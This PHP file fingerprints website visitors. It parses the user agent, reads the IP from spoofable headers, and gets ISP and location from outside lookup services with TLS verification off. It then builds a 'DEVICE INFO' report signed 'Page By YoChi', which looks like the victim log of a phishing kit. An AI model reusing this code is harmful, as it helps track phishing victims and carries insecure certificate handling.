<?php

/*

 */

function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";
	$os_array = array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/windows|win32/i'      =>  'Windows',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ($os_array as $regex => $value) {
		if (preg_match($regex, $u_agent)) {
			$platform = $value;
		}
	}


    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
    elseif(preg_match('/mobile/i',$u_agent))
    {
        $bname = 'Handheld Device';
        $ub = "Handheld Device";
    }
    elseif(preg_match('/maxthon/i',$u_agent))
    {
        $bname = 'Maxthon';
        $ub = "Maxthon";
    }
    elseif(preg_match('/konqueror/i',$u_agent))
    {
        $bname = 'Konqueror';
        $ub = "Konqueror";
    }

    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }

    // check if we have a number
    if ($version==null || $version=="") {$version="?";}

    return array(
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
    );
}

$ua=getBrowser();
$yourbrowser = $ua['name'] . " " . $ua['version'] . " on " .$ua['platform'] ;

function getip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};

function getlocisp($ip){
$getdetails = "https://extreme-ip-lookup.com/json/".$ip;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$a    = curl_exec($curl);
curl_close($curl);
$aj=json_decode($a);
$a=$aj->isp.' '.$aj->country;
return $a;};

function getloc($ip){
$getdetails = "https://ipinfo.io/".$ip."/geo";
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
return $content;};


function descuserattributes(){
	global $yourbrowser;
	$PublicIP = getip();
	$ipname=gethostbyaddr($PublicIP);
	$isp=getlocisp($PublicIP);
	$Machine = $_SERVER['HTTP_USER_AGENT'];
	$jiploc = @json_decode(getloc($PublicIP),true);
	$ipnarr=array('city'=>'Unknown','region'=>'Unknown','country'=>'Unknown');
	foreach($jiploc as $key => $value){$ipnarr[$key]=$value;};
	$iploc = $ipnarr['city'].', '.$ipnarr['region'].' '.$ipnarr['country'];
	$date=date('d-m-Y H:i:s');
	$content = "
|------------ 💻🌏 DEVICE INFO 🌏💻 -----------|
IP ADDRESS       : $PublicIP
IP NAME          : $ipname
CARRIER          : $isp
DATE OF SESSION  : $date
BROWSER          : $yourbrowser
USER AGENT       : $Machine
LOCATION         : $iploc
|--===-===-===--Page By YoChi--===-===-===--|";
	return $content;};

?>